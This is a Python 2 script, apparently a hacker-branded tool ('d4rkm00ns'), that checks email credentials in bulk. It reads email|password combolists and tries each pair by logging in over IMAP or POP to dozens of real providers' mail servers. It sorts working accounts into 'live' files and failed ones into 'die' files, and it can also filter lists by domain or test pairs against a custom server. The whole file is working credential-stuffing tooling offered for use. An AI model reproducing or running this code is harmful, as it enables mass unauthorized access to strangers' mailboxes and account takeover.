import random
import time
import imaplib
import poplib
import shutil as mfl

# all machine Luxury Mode

WARNING = '\033[93m'
CEND = '\33[0m'
BOLD = '\033[1m'
CWHITE2 = '\33[97m'
CRED = '\33[31m'
CBEIGE = '\33[36m'

def luxury(timex):
    global op
    rd = ''.join(random.choice("abcdefghijklmnoPQRSTUVWXYZ")for _ in range(3))
    fl = raw_input(timex+BOLD+CWHITE2+"[+]Emaillist Name root@d4rkm00ns: "+CEND)
    try:
        op = open(fl, "r")
    except Exception:
        print timex+WARNING+"[!]File not Found..!!"+CEND
        print timex+WARNING+"[+]Make sure your file..!!"+CEND
        exit()
    delim = raw_input(timex+BOLD+CWHITE2+"[+]Delimeter root@d4rkm00ns: "+CEND)
    live = open("live-"+rd+".txt", "w")
    die = open("die-"+rd+".txt", "w")
    uk = open("Unknown.txt", "a")
    rl = op.readlines()
    # IMAP
    def mesin(id, u, p, jen, hspt):
        server = jen(hspt[0], hspt[1])
        server.login(u, p)
        print timex+str(id)+CBEIGE+" True "+CEND+u+" | "+p
        live.write("True "+u+"|"+p+"\n")
        server.logout()
    # POP
    def popPeek(id, u, pa, jen, hspt):
        p = jen(hspt[0], hspt[1])
        p.user(u)
        p.pass_(pa)
        print timex+str(id)+CBEIGE+" True "+CEND+u+" | "+pa
        live.write("True "+u+"|"+pa+"\n")
        p.quit()
        # jika try: except: ditaruh disini
        # pada line print dan write
        # terjadi str concate jadi harus di buatkan
        # def lagi.....

    def simple():
        try:
            mesin(id, u, p, jen, hspt)
        except Exception, e:
            print e
            print timex+str(id)+CRED+" False "+CEND+u+" | "+p
            die.write("False "+u+"|"+p+"\n")
        finally:
            print timex + "./d4rkm00ns"

    def simpop():
        try:
            popPeek(id, u, p, jen, hspt)
        except Exception, e:
            print e
            print timex+str(id)+CRED+" False "+CEND+u+" | "+p
            die.write("False "+u+"|"+p+"\n")
        finally:
            print timex+"./d4rkm00ns"

    id = 0
    for i in rl:
        id += 1
        try:
            u = i.strip().split(delim)[0].lower()
            p = i.strip().split(delim)[1]
        except Exception:
            print WARNING+"[!]Check line "+str(id)+" maybe not sure"+CEND
            time.sleep(0.7)
        if "@gmail" in i:
            print BOLD+"[*]@gmail"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.gmail.com", 993
            simple()
        elif "@yahoo" in i:
            print BOLD+"[*]@yahoo"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.mail.yahoo.com", 993
            simple()
        elif "@aol" in i or "@verizon" in i:
            print BOLD+"[*]@aol"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.aol.com", 993
            simple()
        elif "@yandex" in i:
            print BOLD+"[*]@yandex"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.yandex.com", 993
            simple()
        elif "@outlook" in i:
            print BOLD+"[*]@outlook"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap-mail.outlook.com", 993
            simple()
        elif "@hotmail" in i:
            print BOLD+"@hotmail"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap-mail.outlook.com", 993
            simple()
        elif "@live" in i:
            print BOLD+"[*]@live"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap-mail.outlook.com", 993
            simple()
        elif "@orange.fr" in i:
            print BOLD+"[*]@orange.fr"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.orange.fr", 993
            simple()
        elif "@alice.it" in i:
            print BOLD+"[*]@alice.it"+CEND
            jen = imaplib.IMAP4
            hspt = "in.alice.it", 143
            simple()
        elif "@gmx" in i:
            print BOLD+"[*]@gmx"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.gmx.com", 993
            simple()
        elif "@free.fr" in i:
            print BOLD+"[*]@free.fr"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.free.fr", 993
            simple()
        elif "@t-online" in i:
            print BOLD+"[*]@t-online.de"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "secureimap.t-online.de", 993
            simple()
        elif "@mail"in i:
            print BOLD+"[*]@mail"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.mail.com", 993
            simple()
        elif "@web" in i:
            print BOLD+"[*]@web"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.web.de", 993
            simple()
        elif "@wanadoo" in i:
            print BOLD+"[*]@wanadoo"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.orange.fr", 993
            simple()
        elif "@tiscali.it" in i:
            print BOLD+"[*]@tiscali.it"+CEND
            jen = imaplib.IMAP4
            hspt = "imap.tiscali.it", 143
            simple()
        elif "@comcast" in i:
            print BOLD+"[*]@comcast"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.comcast.net", 993
            simple()
        elif "@sympatico" in i:
            print BOLD+"[*]@sympatico"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.bell.net", 993
            simple()
        elif "@tm.net.my" in i:
            print BOLD+"[*]@tm.net.my"+CEND
            jen = poplib.POP3
            hspt = "pop.tm.net.my", 110
            simpop()
        elif "@list.ru" in i:
            print BOLD+"[*]@list.ru"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.mail.ru", 993
            simple()
        elif "@vp.pl" in i:
            print BOLD+"@[*]vp.pl"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.poczta.onet.pl", 993
            simple()
        elif "@km.ru" in i:
            print BOLD+"[*]@km.ru"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.km.ru", 993
            simple()
        elif "@binternet" in i:
            print BOLD+"@binternet"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "mail.binternet.com", 993
            simple()
        elif "@blueyonder.co.uk" in i:
            print BOLD+"[*]@blueyonder.co.uk"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap4.blueyonder.co.uk", 993
            simple()
        elif "@bigpond" in i:
            print BOLD+"[*]@bigpond"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.telstra.com", 993
            simple()
        elif "@virgilio" in i:
            print BOLD+"[*]@virgilio"+CEND
            jen = poplib.POP3
            hspt = "in.virgilio.it", 110
            simpop()
        elif "@libero" in i:
            print BOLD+"[*]@libero.it"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imapmail.libero.it", 993
            simple()
        elif "@tin.it" in i:
            print BOLD+"[*]@tin.it"+CEND
            jen = poplib.POP3
            hspt = "box.tin.it", 110
            simpop()
        elif "@charter.net" in i:
            print BOLD+"[*]@charter.net"+CEND
            jen = imaplib.IMAP4
            hspt = "imap.charter.net", 143
            simple()
        elif "@cox.net" in i:
            print BOLD+"[*]@cox.net"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.cox.net", 993
            simple()
        elif "@neuf.fr" in i:
            print BOLD+"[*]@neuf.fr"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.sfr.fr", 993
            simple()
        elif "@nfr.fr" in i:
            print BOLD+"[*]@nfr.fr"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.sfr.fr", 993
            simple()
        elif "@sbcglobal.net" in i:
            print BOLD+"[*]@sbcglobal.net"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.mail.att.net", 993
            simple()
        elif "@bellsouth.net" in i:
            print BOLD+"[*]@bellsouth.net"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.mail.att.net", 993
            simple()
        elif "@nate.com" in i:
            print BOLD+"[*]@nate.com"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.nate.com", 993
            simple()
        elif "@aliceadsl.fr" in i:
            print BOLD+"[*]@aliceadsl.fr"+CEND
            jen = poplib.POP3
            hspt = "pop.aliceadsl.fr", 110
            simpop()
        elif "@tiscali.co.uk" in i:
            print BOLD+"[*]@tiscali.co.uk"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.talktalk.net", 993
            simple()
        elif "@msn" in i:
            print BOLD+"[*]@msn"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap-mail.outlook.com", 993
            simple()
        elif "@optusnet.com.au" in i:
            print BOLD+"[*]optusnet.com.au"+CEND
            jen = imaplib.IMAP4
            hspt = "mail.optusnet.com.au", 143
            simple()
        elif "@dodo.com.au" in i:
            print BOLD+"[*]dodo.com.au"+CEND
            jen = poplib.POP3
            hspt = "pop.dodo.com.au", 110
            simpop()
        elif "@iprimus.com.au" in i:
            print BOLD+"[*]@iprimus.com.au"+CEND
            jen = imaplib.IMAP4
            hspt = "imap.iprimus.com.au", 143
            simple()
        elif "@westnet.com.au" in i:
            print BOLD+"[*]@westnet.com.au"+CEND
            jen = imaplib.IMAP4
            hspt = "mail.westnet.com.au", 143
            simple()
        elif "@iinet.net.au" in i:
            print BOLD+"[*]@iinet.net.au"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "mail.iinet.net.au", 993
            simple()
        elif "@earthlink.net" in i:
            print BOLD+"[*]@earthlink.net"+CEND
            jen = imaplib.IMAP4
            hspt = "imap.earthlink.net", 143
            simple()
        elif "@freeuk.com" in i:
            print BOLD+"[*]@freeuk.com"+CEND
            jen = poplib.POP3_SSL
            hspt = "pop.clara.net",995
            simpop()
        elif "@juno.com" in i:
            print BOLD+"[*]@juno.com"+CEND
            jen = poplib.POP3_SSL
            hspt = "pop.juno.com", 995
            simpop()
        elif "@optonline.net" in i:
            print BOLD+"[*]@optonline.net"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "mail.optonline.net", 993
            simple()
        elif "@talktalk.net" in i:
            print BOLD+"[*]@talktalk.net"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "mail.talktalk.net", 993
            simple()
        elif "@naver.com" in i:
            print BOLD+"[*]@naver.com"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "imap.naver.com", 993
            simple()
        elif "@netzero.net" in i:
            print BOLD+"[*]@netzero.net"+CEND
            jen = poplib.POP3_SSL
            hspt = "pop.netzero.com", 995
            simpop()
        elif "@optusnet.com.au" in i:
            print BOLD+"[*]@optusnet.com.au"+CEND
            jen = imaplib.IMAP4
            hstp = "mail.optusnet.com.au", 143
            simple()
        elif "@dodo.com.au" in i:
            print BOLD+"[*]@dodo.com.au"+CEND
            jen = poplib.POP3
            hspt = "pop.dodo.com.au", 110
            simpop()
        elif "@iprimus.com.au" in i:
            print BOLD+"[*]@iprimus.com.au"+CEND
            jen = imaplib.IMAP4
            hspt = "imap.iprimus.com.au", 143
            simple()
        elif "@westnet.com.au" in i:
            print BOLD+"[*]@westnet.com.au"+CEND
            jen = imaplib.IMAP4
            hspt = "mail.westnet.com.au", 143
            simple()
        elif "@iinet.net.au" in i:
            print BOLD+"[*]@iinet.net.au"+CEND
            jen = imaplib.IMAP4_SSL
            hspt = "mail.iinet.net.au", 993
            simple()
        else:
            print BOLD+"[*]Unknown"+CEND
            print timex+str(id)+" Unknown "+u+" | "+p
            uk.write("Unknown "+u+"|"+p)
            print timex+"./d4rkm00ns"
    op.close()
    live.close()
    die.close()
    uk.close()
    mfl.move("live-"+rd+".txt", "Result")
    mfl.move("die-"+rd+".txt", "Result")

def customfilter(timex):
    import sys
    elis = raw_input(timex+BOLD+CWHITE2+"[+]Emaillist File Name root@d4rkm00ns: "+CEND)
    fstor = raw_input(timex+BOLD+CWHITE2+"[+]File Name to Stored result root@d4rkm00ns: "+CEND)
    filt = raw_input(timex+BOLD+CWHITE2+"[+]Filter by Domain ex: @internet.com root@d4rkm00ns: "+CEND)
    print timex+"[+]Starting..!!"
    time.sleep(0.5)
    print timex+"[+]Opening File.."
    time.sleep(0.5)
    op = open(elis, "r")
    ops = open(fstor, "w")
    time.sleep(0.7)
    print timex+"[+]Processing.."
    rl = op.readlines()
    time.sleep(0.7)
    print timex+"[+]Please Wait.."
    totlen = len(rl)
    print timex+"[+]==--+ ["+str(totlen)+"%] +--=="
    print timex+"[+]==--+ [waiting..] +--=="
    idx = 0
    for i in rl:
        try:
            idx += 1
            sys.stdout.write("\r" + timex + "[*]==--+ [%d%%] +--==" % idx)
            sys.stdout.flush()
            pc = i.split("|")
            us_ = pc[0].lower()
            pa_ = pc[1]
            if str(filt) in us_:
                ops.write(us_+" | "+pa_)
            pass
        except IndexError:
            print WARNING+"[!]Check line: "+str(idx)+" maybe not sure"+CEND
    op.close()
    ops.close()
    mfl.move(fstor, "ResFiltered")
    print ""
    print timex + "[+]Done"
    print timex + "[+]Result stored in ResFiltered"

def customserver(timex):
    def imapz(username, password, serv, port, jen):
        server = jen(serv, port)
        server.login(username, password)
        print timex+CBEIGE+"[!]True "+CEND+username+" | "+password
        gl.write("[!]True "+username+"|"+password+"\n")
        server.logout()

    def popz(username, password, serv, port, jen):
        logz = jen(serv, port)
        logz.user(username)
        logz.pass_(password)
        print timex + CBEIGE + "[!]True " + CEND + username + " | " + password
        gl.write("[!]True "+username+"|"+password+"\n")
        logz.logout()

    in_fl = raw_input(timex+BOLD+CWHITE2+"[+]Emaillist File Name root@d4rkm0ns: "+CEND)
    ser = raw_input(timex+BOLD+"[+]Set Server root@d4rkm00ns: "+CEND)
    por = input(timex+BOLD+CWHITE2+"[+]Set Port root@d4rkm00ns: "+CEND)
    if por == 993:
        jen = imaplib.IMAP4_SSL
    elif por == 143:
        jen = imaplib.IMAP4
    elif por == 995:
        jen = poplib.POP3_SSL
    elif por == 110:
        jen = poplib.POP3
    else:
        print timex+WARNING+"[!]Port Invalid.."+CEND
        exit()
    fnml = raw_input(timex+BOLD+CWHITE2+"[+]File Live Name to stored result: "+CEND)
    fnmd = raw_input(timex+BOLD+CWHITE2+"[+]File Die Name to stored result: "+CEND)
    gl = open(fnml, "w")
    gd = open(fnmd, "w")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    x = 0
    global username
    global password
    if por == 993 or por == 143:
        for i in op_rl:
            x += 1
            try:
                username = i.strip().split("|")[0].lower()
                password = i.strip().split("|")[1]
            except Exception:
                print timex + WARNING + "[!]Check line: " + str(x) + " may not sure" + CEND
            print timex + "[+]count %s" % x
            try:
                imapz(username, password, ser, por, jen)
            except Exception, e:
                print e
                print timex + CRED + "[!]False " + CEND + username + " | " + password
                gd.write("[!]False " + username + "|" + password + "\n")
            finally:
                print timex + "[+]./d4rm00ns"
    elif por == 995 or por == 110:
        for i in op_rl:
            x += 1
            try:
                username = i.strip().split("|")[0].lower()
                password = i.strip().split("|")[1]
            except Exception:
                print timex + WARNING + "[!]Check line: " + str(x) + " may not sure" + CEND
            print timex + "[+]count %s" % x
            try:
                popz(username, password, ser, por, jen)
            except Exception, e:
                print e
                print timex + CRED + "[!]False " + CEND + username + " | " + password
                gd.write("[!]False " + username + "|" + password + "\n")
            finally:
                print timex + "[+]./d4rm00ns"

    fl_op.close()
    gl.close()
    gd.close()
    mfl.move(fnml, "Result")
    mfl.move(fnmd, "Result")
    print ""
    print timex + "[+]Done"
    print timex + "[+]Result stored in ResFiltered"